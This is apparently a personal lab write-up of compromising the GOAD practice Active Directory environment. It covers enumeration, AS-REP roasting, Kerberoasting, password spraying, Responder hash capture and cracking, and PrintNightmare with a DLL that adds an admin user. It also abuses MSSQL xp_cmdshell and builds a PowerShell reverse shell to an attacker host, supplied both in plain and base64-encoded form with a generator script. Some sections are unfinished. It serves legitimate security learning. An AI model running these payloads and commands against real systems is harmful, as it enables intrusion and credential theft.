## 1. Recon

First let's start the reconnaissance of the GOAD by searching all the available IPs.

From the first steps, I will launch crackmapexec to get all the windows machine IP, names and domains.

**crackmapexec** is a powerful tool which simplifies the process of interacting with multiple protocols and services. It plays an important role in Reconnaissance as it enables automated enumeration. 

```shell
crackmapexec smb 10.4.10.1/24
```

Via this command I will scan the subnet of devices from 10.4.10.1 to 10.4.10.254 over the SMB protocol. The results will allow to gather information about the SMB services in this IP range.

From this we get the following result:

<img width="1284" alt="Pasted_image_20241218165858" src="https://github.com/user-attachments/assets/20b07e71-b42d-4c9f-9ad9-15df5a64356a" />

Here we can see some important information. We have learned that there are three domains:
- north.sevenkingdoms.local
- sevenkingdoms.local
- essos.local

They have a number of IP-s associated with them.
- north.sevenkingdoms.local:
	- Winterfell (windows server 2019) - **10.4.10.11**
	- Castelblack (windows server 2019) (signing false) - **10.4.10.22**
- sevenkingdoms.local:
	- Kingslanding (windows server 2019) - **10.4.10.10**
- essos.local:
	- Meereen (Windows Server 2016) - **10.4.10.12**
	- Braavos (Windows Server 2019) (signing false) - 10.4.10.23


### 1.1 Enumerating Users and Groups

We will continue to use "crackmapexec" to enumerate users, and will try to do it for all of GOAD machines.

From the previous command, we saw the hosts available, I will run "cracmapexec" to enumerate users on these hosts.

```bash
crackmapexec smb 10.4.10.10 --users
```

This command didn't bring any results at all! But after checking all the hosts, I got some results, on host 10.4.10.11 "Winterfell".

183db8bc2c33ac4d835e309332489e94a3d9b048

<img width="1279" alt="Pasted_image_20241219165113" src="https://github.com/user-attachments/assets/316b69c5-98d3-4fdd-8efa-7462bd0ab0ae" />


Here there is a user which has also the password on description **Samwell Tarly (Password: Heartsbane).**

Now I will use another tool to get the groups. `enum4linux 10.4.10.11` gave the following groups:

```shell
group:[Domain Users] rid:[0x201]
group:[Domain Guests] rid:[0x202]
group:[Domain Computers] rid:[0x203]
group:[Group Policy Creator Owners] rid:[0x208]
group:[Cloneable Domain Controllers] rid:[0x20a]
group:[Protected Users] rid:[0x20d]
group:[DnsUpdateProxy] rid:[0x44f]
group:[Stark] rid:[0x452]
group:[Night Watch] rid:[0x453]
group:[Mormont] rid:[0x454]
```

`enum4linux` provided also the information of which users belong to which groups:

- Domain Users:
	- Administrator
	- localuser
	- krbtgt
	- SEVENKINGDOMS$
	- arya.stark
	- eddard.stark
	- catelyn.stark
	- robb.stark
	- sansa.stark
	- brandon.stark
	- rickon.stark
	- hodor
	- jon.snow
	- samwell.tarly
	- jeor.mormont
	- sql_svc
- Domain Guests
	- Guest
- Night Watch
	- jon.snow
	- samwell.tarly
	- jeor.mormont
- Mormont
	- jeor.mormont
- Domain Computers
	- CASTELBLACK$
- Group Policy Creator Owners
	- Administrator
- Stark
	- arya.stark
	- eddard.stark
	- catelyn.stark
	- robb.stark
	- sansa.stark
	- brandon.stark
	- rickon.stark
	- hodor
	- jon.snow
### How did the enumeration happen

It first detected the SMB service on port 445, then identified information such as:
- NetBIOS Name: WINTERFELL
- Domain: north.sevenkingdoms.local
- SMB Signing: It's enabled which makes MitM attacks harder, but it doesn't prevent enumeration.
- SMBV1 is disabled, meaning that more modern SMB protocols are in use.

Then it tries to enumerate domain users using NTLM authentication mechanism, but it fails. This because it requires valid credentials.

The next step is to try the enumeration via SAMRPS (Security Account Manager Remote Protocol), which interacts with the SAM database.

Here the enumeration was successful most probably because null session is allowed.

Null session refers to a connection without any authentication (anonymous connection), which happens because of misconfigured systems. This allowed crackmapexec to query the information from SAM database, and give back the users.

### Retrieving the Password Policy

Another important information for attacker is the Password Policy which can give insight to what is the structure of the passwords, and hints that can give unauthorized access.

**crackmapexec** can help retrieving the password policy.

```shell
crackmapexec smb 10.4.10.11 --pass-pol
```

We got success only on the "Winterfell" again:

<img width="1258" alt="Pasted_image_20241220091449" src="https://github.com/user-attachments/assets/82d53236-92f0-43f2-821d-6444d3af3f27" />

One of the important information gained here is:

```shell
SMB  10.4.10.11  445    WINTERFELL       Reset Account Lockout Counter: 5 minutes
SMB  10.4.10.11  445    WINTERFELL       Locked Account Duration: 5 minutes
SMB  10.4.10.11  445    WINTERFELL       Account Lockout Threshold: 5
```

This means that if the password fails 5 times in 5 minutes, the account will be locked for 5 minutes.

This should be taken into consideration if we brute-force.
### Getting users from other hosts

We only got information from 10.4.10.11 - the Winterfell DC, but not from the others. The reason is that Winterfell allows anonymous connection.

Other hosts are not allowing anonymous connection. Usually this is what happens in real-life.

But there is another way on getting the users, which is by brute-forcing. Anyways, to do this some initial information is needed, as to what format are the usernames, or any other information that can show how the usernames are formed.

From the previous usernames found we see two hints that may help on finding the other usernames:
- the format of the usernames is "name.lastname"
- usernames are from the characters of Game of Thrones.

So, in this case I will create a list of usernames gained from Game of Thrones characters, and will check them against other hosts.

By going to "https://www.hbo.com/game-of-thrones/cast-and-crew" we can see all GoT characters, and in the Page Source the names can be seen on `aria-label="..."`

<img width="780" alt="Pasted_image_20241220104559" src="https://github.com/user-attachments/assets/b9131521-6a37-4edf-bd79-7a0562553b7e" />

I will use this information and get these names in the format that we need, by using `curl, grep, cut, and awk`.

```shell
curl -s https://www.hbo.com/game-of-thrones/cast-and-crew | grep 'href="/game-of-thrones/cast-and-crew/'| grep -o 'aria-label="[^"]*"' | cut -d '"' -f 2 | awk '{if($2 == "") {print tolower($1)} else {print tolower($1) "." tolower($2);} }' > username`
```

Basically we download the page, search for the part where there is "aria-label", cut it and get the full name, and check if there is no last name, get only the first name in lower characters, and if there is a last name, append it after the first name and add a `.` in between, and in the end save it to a file `username`.

I will brute-force Kerberos (a network authentication protocol designed to authenticate users or systems), which is widely used in Active Directory.

Kerberos uses **pre-authentication** which is a security measure to ensure that only valid users can request a Kerberos ticket.

Basically, when a user wants to authenticate, they send an initial request (AS-REQ) from the Key Distribution Center (KDC), which responds with a challenge that has to be encrypted using the user's password.

This is what I will target to brute-force, by sending requests for each user in the list, and if that user exists, Kerberos will respond with a "Pre-authentication required", which means the user exists.

If the server responds with a "Principal Unknown" it means that the username is not in the database.

This can be done by using `nmap`.

```shell
nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='sevenkingdoms.local',userdb=username" 10.4.10.10 > sevenkingdoms_users
```

And we go some results for **Kingslanding** - 10.4.10.10!

<img width="811" alt="Pasted_image_20241220115808" src="https://github.com/user-attachments/assets/2be6a890-aa8f-4932-b7e1-6c762854a991" />

For 10.4.10.11, we launch:
```shell
nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='sevenkingdoms.local',userdb=username" 10.4.10.11 > north_evenkingdoms_users
```

And we got the results:

<img width="811" alt="Pasted_image_20241220115230" src="https://github.com/user-attachments/assets/64d46120-e5ad-457d-ba85-bfde074d676d" />

After checking we got some results also from Meeren, by issuing this command:

```shell
nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='essos.local',userdb=username" 10.4.10.12 > essos_users
```

<img width="811" alt="Pasted_image_20241220115207" src="https://github.com/user-attachments/assets/e5c64e12-77bf-46e6-962d-b86f87d69b0b" />

### Getting the Passwords

#### ASREPROASTING
First I will try **asreproasting** to try and get some passwords from the users I got hands on.

**asreproasting** is a type of attack which exploits accounts that don't require Kerberos pre-authentication. It sends an AS-REQ to KDC, and if the pre-authentication is disabled, the reponse is with an AS-REP message which contains encrypted data, where can be found also the password hash.

First we need to extract only the usernames from the results we got before. 

Now I will try to get the passwords, and for this I will use the `impacket tools` which can be downloaded from `https://github.com/fortra/impacket/tree/master`.

`GetNPUsers` is one of the tools part of `impacket` which I will use for this purpose. It basically attempts to get TGTs for the users that don't have the property "Do not require Kerberos preauthentication".

```shell
GetNPUsers.py north.sevenkingdoms.local/ -no-pass -usersfile north_sevenkingdoms_filtered
```

From this command I got a ticket for `brandon.stark`:

<img width="1655" alt="Pasted_image_20241220161706" src="https://github.com/user-attachments/assets/482dfb60-02a4-4538-ad15-420b6519c845" />

Now I will try hashcat with this hash, after i copy it in a file.

By issuing the command `hashcat -m 18200 hashed /usr/share/wordlists/rockyou.txt` which tells the hashcat to use the Kerberos as a decryption mechanism and try the rockyou wordlist to brute-force it, I got the following results:

<img width="1630" alt="Pasted_image_20241220162914" src="https://github.com/user-attachments/assets/6c2c26c1-d002-4972-b152-5f48ac0bf214" />

Here I can see the cracked password: `iseedeadpeople`.

#### Password Spraying
Now I will try Password Spraying to see if some additional passwords can be gained. Password Spraying is a technique where a single or small list of passwords is systematically tried across multiple user accounts.

I will use the list of usernames as a password list, so the usernames will be tried if they have a password which is the same as any of the usernames.

For this attack I will use the `Sprayhound` tool:

```shell
sprayhound -U username -d north.sevenkingdoms.local -dc 10.4.10.11 -lu samwell.tarly -lp Heartsbane --lower -t 2
```

In order to avoid the account lockdown, when trying different password, I provide here the credentials of an account that we have `samwell.tarly - Heartsbane`, and I provide the username file as a list of usernames and that will be used as the list of passwords as well.

Via this command, the `sprayhound` will try to get password policies, and then by providing the `-t` I set the threshold to 2, meaning that the tool will stop trying passwords when two tries are left. This information about how many tries are allowed, `sprayhound` hopes to gain via the password policy.

<img width="1214" alt="Pasted_image_20241223094759" src="https://github.com/user-attachments/assets/e99fcedd-9888-4c17-8a19-2076e80839f1" />

And, here I got another password! In total, now I have credentials from three accounts:

```shell
samwell.tarly:Heartsbane
hodor:hodor
brandon.stark:iseedeadpeople
```

### Getting the User Accounts
One of the most important and first steps after acquiring credentials to an AD, is to use that account and get as much information about other users as possible.

There are many tools that help on doing this.

GetADUsers:
```shell
GetADUsers.py -all north.sevenkingdoms.local/brandon.stark:iseedeadpeople
```

<img width="1234" alt="Pasted_image_20241223104053" src="https://github.com/user-attachments/assets/6706792c-96b5-4d4f-b6cc-dc7fc76a4dc9" />

Here there are also some additional information as to where was the last time the password was set and the last time where the account has been logged in to the system.

We can also use the users we have credentials to get users not only from the host they belong to, but also from other hosts in the system, as there is a high probability that there exist a trust between them.

For that we can use `ldapsearch`:

```shell
ldapsearch -H ldap://10.4.10.10 -D "brandon.stark@north.sevenkingdoms.local" -w iseedeadpeople -b 'DC=sevenkingdoms,DC=local' "(&(objectCategory=person)(objectClass=user))" | grep 'distinguishedName'
```

So, from a user `brandon.sark` in Winterfell, I was able to get user information in Kingsldanding:

<img width="1438" alt="Pasted_image_20241223105046" src="https://github.com/user-attachments/assets/4cb63fe2-48aa-4d0c-8bc5-6e96b7bb559d" />

### Kerberoasting
Is an attack technique which tries to identify service accounts with SPNs (Service Principal Names). 
After identifying service accounts, it uses a valid domain user account to request tickets for the SPNs. These tickets are encrypted using the NTLM hash of the service account's password. These tickets are extracted and then if these hashes are cracked, the plaintext password of the service account is exposed.

To launch this attack, I will use again an impacket tool: GetUserSPN.

```shell
GetUserSPNs.py -request -dc-ip 10.4.10.11 north.sevenkingdoms.local/brandon.stark:iseedeadpeople -outputfile kerberoasting
```

The result I got is:

<img width="1438" alt="Pasted_image_20241223113738" src="https://github.com/user-attachments/assets/32421729-574c-49c3-bd75-e50effbb1153" />

So, I didn't get any tickets, and the reason is the error in the end of the response:
`Kerberos Sessionrror: KRB_AP_ERR_SKEW(Clock skew too great)`, which means that there is a discrepancy in time from the our machine and the server that I'm trying to access.

In this case I have to adjust the time on my machine (Kali) so they match.

First disable the Network Time Protocol from auto-updating by running `sudo timedatectl set-ntp off`.

Then match the date and time of Kali with the date and time of the target machine by running `sudo rdate -n 10.4.10.11`

Now I'm going to try again the kerberoasting attack, and we got the hashes:

<img width="1601" alt="Pasted_image_20241223124857" src="https://github.com/user-attachments/assets/93451ed6-9ddc-4b51-9a01-d581ca4dd20b" />

So we got another password, and now in total we have pwned 4 accounts:

```shell
samwell.tarly:Heartsbane
hodor:hodor
brandon.stark:iseedeadpeople
jon.snow:iknownothing
```

### DNS Dump
As soon as we got some credentials, we can try to enumerate the DNS, and for this I will use the `adidnsdump` tool.

This process is important as it helps to understand the network layout and identify potential targets for further exploitation.

```shell
adidnsdump -u 'north.sevenkingdoms.local\jon.snow' -p 'iknownothing' winterfell.north.sevenkingdoms.local
```

Results from this enumeration are stored in records.csv file.

<img width="1067" alt="Pasted_image_20241223135225" src="https://github.com/user-attachments/assets/b994e249-a5e2-46c0-a4b6-bdb9d2aeccd7" />

Not just DNS, we will try to get as much information about the configuration such as group memberships, permissions, computers, etc.

This I will do using the `Bloodhound`.

------------- BLOODHOUND ISSUE -----------------
https://github.com/dirkjanm/BloodHound.py
----------------------------------------

### Responder - Part4
When you don't have any credentials, `responder` is a tool that may give you usernames, netntlmv1 (if the server is old), netntlmv2 hashes, the ability to redirect the authentication (NTLM relay), etc.

- NetNLMv1 and NetNLMv2 - are password hashes used by NTLM (NT LAN Manager) authentication protocol, which is a legacy Microsoft authentication mechanism, and are primarily used in challenge-response authentication processes, such as authenticating users against servers or services.
- NetNTLMv1 - is less secure and more vulnerable to attacks:
	- A client sends its username and a challenge (random number)
	- Server responds with a challenge
	- The client uses the password to compute a hash to the challenge and sends it back.
		- It's vulnerable against brute-force and cryptographic attacks because the challenge-response mechanism is not well-protected.

- NetNLMv2 - is a more secure version of NTLM and includes stronger cryptographic measures.
	- Similar to v1 but the challenge-response mechanism uses a hash timestamp, client nonce, and additional data to protect against replay attacks.
		-  Still susceptible to certain relay attacks but much more resistant to brute-force than NetNTLMv1.

- NTLM Relay - is a type of attack which exploits the way how NTLM authentication works, by relaying authentication attempts to another system or service.
	- The attacker captures a challenge-response from a victim.
	- Instead of cracking the hash, the attacker relays it to a different service or system that accepts NTLM authentication (SMB, LDAP, HTTP).
	- If the relayed creds are valid, the attacker can gain unauthorized access to the target system.

Now I will start `responder` to see if I can get some useful information, and to run the tool I need to know the network interface which I will target, to capture and analyze authentication attempts.

Responder acts as a rogue server, and tricks devices on a network to send authentication data, which then the attacker can use for a number of attacks, such as cracking password hashes, and NTLM relay.

By running `ip a` I see the network interfaces, and the name of the target is `eth0`.

Then I run `responder -I eth0` and the following things happen:

- Responder listens for specific protocols like: LLMNR (Link-Local Multicast Name Resolution) and NBT-NS (NetBIOS Name Service) on eth0.
- When devices on network broadcast queries for names they can't resolve, Responder sends a fake reply pretending to be that service or host.
- When the victim system attempts to authenticate to the fake service, Responder captures the credential hashes.

By this method, I could get hashes of two accounts: **eddard.stark & robb.stark**:

```bash
[SMB] NTLMv2-SSP Client   : 10.4.10.11
[SMB] NTLMv2-SSP Username : NORTH\eddard.stark
[SMB] NTLMv2-SSP Hash     : eddard.stark::NORTH:98db915729cbf673:CAA545B4D425834F5887741416A33EA4:0101000000000000806D80798655DB01D9983AFE29AEA80B0000000002000800540033003400380001001E00570049004E002D0034004200410059005A0059005600300047003300500004003400570049004E002D0034004200410059005A005900560030004700330050002E0054003300340038002E004C004F00430041004C000300140054003300340038002E004C004F00430041004C000500140054003300340038002E004C004F00430041004C0007000800806D80798655DB01060004000200000008003000300000000000000000000000003000005DE594947D1925B89E880EBD1422F0706D876ECC261071DC3B4B573725EFACA20A001000000000000000000000000000000000000900140063006900660073002F004D006500720065006E000000000000000000
```

```bash
[SMB] NTLMv2-SSP Client   : 10.4.10.11
[SMB] NTLMv2-SSP Username : NORTH\robb.stark
[SMB] NTLMv2-SSP Hash     : robb.stark::NORTH:7f945256f0b1ca59:CA2F97E8985703DB0ABE10C43612E499:0101000000000000806D80798655DB0150433DACC59B7BB40000000002000800540033003400380001001E00570049004E002D0034004200410059005A0059005600300047003300500004003400570049004E002D0034004200410059005A005900560030004700330050002E0054003300340038002E004C004F00430041004C000300140054003300340038002E004C004F00430041004C000500140054003300340038002E004C004F00430041004C0007000800806D80798655DB01060004000200000008003000300000000000000000000000003000005DE594947D1925B89E880EBD1422F0706D876ECC261071DC3B4B573725EFACA20A001000000000000000000000000000000000000900160063006900660073002F0042007200610076006F0073000000000000000000
```

Now export both hashes (only the hash starting with for example robb.stark...) to a file to try and crack them with hashcat.

```bash
hashcat -m 5600 --force -a 0 two_hashes /usr/share/wordlists/rockyou.txt
```

I only got success with one account, one of robb.stark:

```bash
ROBB.STARK::NORTH:7f945256f0b1ca59:ca2f97e8985703db0abe10c43612e499:0101000000000000806d80798655db0150433dacc59b7bb40000000002000800540033003400380001001e00570049004e002d0034004200410059005a0059005600300047003300500004003400570049004e002d0034004200410059005a005900560030004700330050002e0054003300340038002e004c004f00430041004c000300140054003300340038002e004c004f00430041004c000500140054003300340038002e004c004f00430041004c0007000800806d80798655db01060004000200000008003000300000000000000000000000003000005de594947d1925b89e880ebd1422f0706d876ecc261071dc3b4b573725efaca20a001000000000000000000000000000000000000900160063006900660073002f0042007200610076006f0073000000000000000000:sexywolfy
```

And I add this to the list of pwned accounts:

```bash
samwell.tarly:Heartsbane
hodor:hodor
brandon.stark:iseedeadpeople
jon.snow:iknownothing
robb.stark: sexywolfy
```

Now let's see what kind of privileges does this account have:

```bash
crackmapexec smb 10.4.10.11 -u robb.stark -p sexywolfy --shares
```

And this account has ADMIN privileges:


<img width="1277" alt="Pasted_image_20241229172248" src="https://github.com/user-attachments/assets/a1c75f2b-8bbf-4033-a0e5-65e6a0dc6aa5" />

#### NTLM Relaying
For the NTLM Relay to be successful, SMB must not be signed, meaning the protocol does not cryptographically verify the integrity and authenticity of the data exchanged between the client and server. 

We know that BAAVOS and CASTELBLACK are **not signed.**

<img width="1284" alt="Pasted_image_20241218165858" src="https://github.com/user-attachments/assets/ce1780d0-b9ef-41bb-aaa0-1a801525e735" />

--------------------------- Not Finished ----------------------------------

# Exploiting with a user - Part 5
#### 5.1 samAccountName (nopac)

Here I will try to combine two vulnerabilities, to get control over the domain. The vulnerabilities are:

- **CVE-2021-42278:** Computer accounts in AD typically have names that end with a `$` which helps to distinguish them from user accounts. Due to the vulnerability the attacker which has access to an account with permissions to create or rename computer accounts, can rename a computer account and remove the `$` sign and make it look like a domain controller (DC1 instead of DC1$).
- **CVE-2021-42287:** When a service ticket is requested, KDC (Key Distribution Center) checks if the requested account exists, and if not, it tries again by appending a `$` to the name. I will use this to impersonate a DC.

------ CME not working with MAQ ------------

#### 5.2 PrintNightmare
In this attack I will target the Print Spooler Service.

Print Spooler is a service in Windows that manages print jobs, stores them in a queue and sends them to the printer for processing, and handles the installation and management of printer drivers.

**PrintNightmare** is a vulnerability that uses the ability of the **Print Spooler** to allow non-administrative users to install arbitrary printer drivers, which can contain malicious code. Normally installing a printer driver should require administrative privileges, but this vulnerability bypasses this vulnerability.

**CVE-2021-34527** is a vulnerability that allows attackers to exploit the Print Spooler remotely. If this service is running on a system that is exposed to the network (a server or a DC), an attacker can send specially crafted requests to the service. This can result in the installation of a malicious driver, which allows the attacker to gain full access to the system.

Let's check if the spooler is active:

```bash
crackmapexec smb 10.4.10.10-23 -M spooler
```

And I can see that it is available in all hosts:

<img width="1273" alt="Pasted_image_20241230153144" src="https://github.com/user-attachments/assets/1990dd01-f790-4121-b9eb-b3b7af8c7ad7" />

Preparing the DLL:

In the file below, there is a RunCMD function which using the system function adds a user account **halilPrintNightmare** with the password **halilWasHere.**

Then it adds this user to the **Administrators** group, which grants administrative privileges. 

This function is called when the DLL is loaded (DLL_Process_ATTACH), which is inside the DllMain function which acts as the entry point for the DLL.

<img width="752" alt="Pasted_image_20241230153948" src="https://github.com/user-attachments/assets/f94c761b-3d61-49f5-99b0-4dc5a1689daf" />

Then I will compile it by using the **x86_64-w64-mingw32-gcc**.
```bash
x86_64-w64-mingw32-gcc -shared -o halilPrintNightmare.dll printNightmare.c
```

This will create a .dll file, and now let's set up an SMB server on the location where .dll file is:

```bash
smbserver.py -smb2support ATTACKERSHARE .
```

Then I need to clone the CVE-2021-1675 exploit.

```bash
git clone https://github.com/cube0x0/CVE-2021-1675 printnightmare 
```

Let's try this exploit on the old unpatched server on `Meereen`:

```bash
python3 CVE-2021-1675.py essos.local/jorah.mormont:'H0nnor!'@meereen.essos.local '\\192.168.56.1\ATTACKERSHARE\nightmare.dll'
```

For this I used the Jorah Mormont credentials, and the result is:

![Pasted_image_20250106185538](https://github.com/user-attachments/assets/e68c34e2-0f0c-4a38-9d6b-f14f3ec6c12d)

Now, I can confirm that the exploit worked in the `Meereen` as I can see the new user there `halilPrintNightmare`.

![](Pasted_image_20241230164921.png)
<img width="752" alt="Pasted_image_20241230164921" src="https://github.com/user-attachments/assets/1e54994b-d475-4aa4-b522-600f676441a8" />

The `DLL-s` can be found also on `C:\Windows\System32\spool\drivers\x64\3`

![Pasted_image_20250106185931](https://github.com/user-attachments/assets/f3fa67b6-00cc-46c6-841e-ffadd739b7c4)

# ADCS

Here I will try attacks when ADCS is setup in the domain. 

**ADCS** (Active Directory Certificate Services) is a service used for managing public key infrastructure (PKI), and allows organizations to issue and manage digital certificates for users, computers, and services.

They then enable secure communication, authentication, and encryption across networks.

First let's check if there is a web enrollement up and running, and I see that there is one running at `Braavos` at `10.4.10.23` by running:

```bash
curl http://10.4.10.23/certsrv/certfnsh.asp
```

I see that it requires some credentials:

![Pasted_image_20250106192709](https://github.com/user-attachments/assets/2d7ac66d-4058-4fb6-be58-f2371d0f2cfa)

## ESC8 with certipy

First setup the listener:

![Pasted_image_20250106194333](https://github.com/user-attachments/assets/2024997d-1066-4644-a51b-645fefc04a33)

------------------------ TO BE CONTINUED ----------
# MSSQL

First I will try to find users with an SPN on an MSSQL server, on **north.sevenkingdoms.local** by using the `GetUserSPNs.py`:

```bash
GetUserSPNs.py north.sevenkingdoms.local/brandon.stark:iseedeadpeople
```

And the result is:

![Pasted_image_20250106222844](https://github.com/user-attachments/assets/ffe969b8-7544-4268-a78c-8f23106a9eca)

On essos domain:

![Pasted_image_20250106222913](https://github.com/user-attachments/assets/d5c673fd-f66f-4bc5-a98b-816c19010930)

This can be done by using `crackmapexec` as well:

```bash
crackmapexec mssql 10.4.10.22-23
```

This gives the following result:

![Pasted_image_20250106223155](https://github.com/user-attachments/assets/5ee1aa22-f9fe-4304-b210-14049cb83edf)

Now let's try to connect to the MSSQL server using the `mssqlclient.py` from `impacket` and using the Samwell Tarly credentials.

```bash
python3 mssqlclient.py -windows-auth north.sevenkingdoms.local/samwell.tarly:Heartsbane@castelblack.north.sevenkingdoms.local
```

This gets us in:

![Pasted_image_20250106223409](https://github.com/user-attachments/assets/d452ee6d-aefe-4e40-b8a9-bb991486c3eb)

Now let's enumerate the logins with `enum_logins`:

![Pasted_image_20250106223532](https://github.com/user-attachments/assets/9d348ea4-d7f1-4a5d-bfcb-083a696a7b24)

Now let's try to find accounts that can be impersonated by running the `enum impersonate`.

![Pasted_image_20250106224351](https://github.com/user-attachments/assets/bca25d26-7698-4c57-9099-34ad8c470aef)

This is really important as now I can see that I can impersonate the user `sa`, which can be done by using `exec_as_login sa`

Let's enable the xp_cmdshell stored procedure which allows hte execution of OS commands from within SQL Server, by using `enable_xp_cmdshell`.

Now, let's see if I can run the command whoami by running `xp_cmdshell whoami`, and I got:

![Pasted_image_20250106224945](https://github.com/user-attachments/assets/0802a0ba-6f3d-453a-a1fa-aa04f2aa24e3)

This means that I got **COMMAND EXECUTION**!

By using the `sa` I will try to enumerate the logins again and I see a lot more things, and also that **jon.snow** is the sysadmin on the server.

![Pasted_image_20250106225150](https://github.com/user-attachments/assets/81f0fea5-2f83-4971-af51-76827e81b12f)

As sysadmin user I can see also the other users with impersonation privileges, so I'm going to see that information now.

<img width="765" alt="Pasted_image_20250106225343" src="https://github.com/user-attachments/assets/2bfbeb17-ab31-43da-81a4-dd3135f1d34a" />

Here I see that `brandon.stark` has impersonation privileges on `jon.snow` and I can conclude that i can access brandon.stark and do `execute as login` on jon.snow.

## Get a Reverse Shell

Let's use the following basic Powershell webshell, which points to our Kali Linux machine with the port: 4444.

```PowerShell
$c = New-Object System.Net.Sockets.TCPClient('10.4.10.99',4444); $s = $c.GetStream();[byte[]]$b = 0..65535|%{0}; while(($i = $s.Read($b, 0, $b.Length)) -ne 0){     $d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);     $sb = (iex $d 2>&1 | Out-String );     $sb = ([text.encoding]::ASCII).GetBytes($sb + 'ps> ');     $s.Write($sb,0,$sb.Length);     $s.Flush() }; $c.Close()
```

Write a Python script which converts this to base64 in utf16.

```Python
#!/usr/bin/env python
import base64
import sys

if len(sys.argv) < 3:
  print('usage : %s ip port' % sys.argv[0])
  sys.exit(0)

payload="""
$c = New-Object System.Net.Sockets.TCPClient('%s',%s);
$s = $c.GetStream();[byte[]]$b = 0..65535|%%{0};
while(($i = $s.Read($b, 0, $b.Length)) -ne 0){
    $d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);
    $sb = (iex $d 2>&1 | Out-String );
    $sb = ([text.encoding]::ASCII).GetBytes($sb + 'ps> ');
    $s.Write($sb,0,$sb.Length);
    $s.Flush()
};
$c.Close()
""" % (sys.argv[1], sys.argv[2])

byte = payload.encode('utf-16-le')
b64 = base64.b64encode(byte)
print("powershell -exec bypass -enc %s" % b64.decode())
```

Now, by using this python script, with the following command I will have the base64 string:

`python3 payloadToUtf16ToBase64.py 10.4.10.99 4444`

![Pasted_image_20250106235726](https://github.com/user-attachments/assets/668f4ae1-c40a-4298-8662-fb4dc0132600)

Then, repeat the `MSSQL` process from above and execute as login `sa` from `samwell.tarly`.

In a new terminal on Kali Linux, start a listening process on port 4444:

```bash
nc -nlvp 4444
```

After enabling xp_cmdshell, run the command to execute the Shell:

```Bash
xp_cmdshell powershell -exec bypass -enc CgAkAGMAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBTAG8AYwBrAGUAdABzAC4AVABDAFAAQwBsAGkAZQBuAHQAKAAnADEAMAAuADQALgAxADAALgA5ADkAJwAsADQANAA0ADQAKQA7AAoAJABzACAAPQAgACQAYwAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AAoAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAC4AUgBlAGEAZAAoACQAYgAsACAAMAAsACAAJABiAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewAKACAAIAAgACAAJABkACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIALAAwACwAIAAkAGkAKQA7AAoAIAAgACAAIAAkAHMAYgAgAD0AIAAoAGkAZQB4ACAAJABkACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7AAoAIAAgACAAIAAkAHMAYgAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBiACAAKwAgACcAcABzAD4AIAAnACkAOwAKACAAIAAgACAAJABzAC4AVwByAGkAdABlACgAJABzAGIALAAwACwAJABzAGIALgBMAGUAbgBnAHQAaAApADsACgAgACAAIAAgACQAcwAuAEYAbAB1AHMAaAAoACkACgB9ADsACgAkAGMALgBDAGwAbwBzAGUAKAApAAoA
```

And on the terminal where we were listening we got a SHELL:

![Pasted_image_20250107000204](https://github.com/user-attachments/assets/f11a9926-977b-4921-97f1-635dfe6a2c9a)

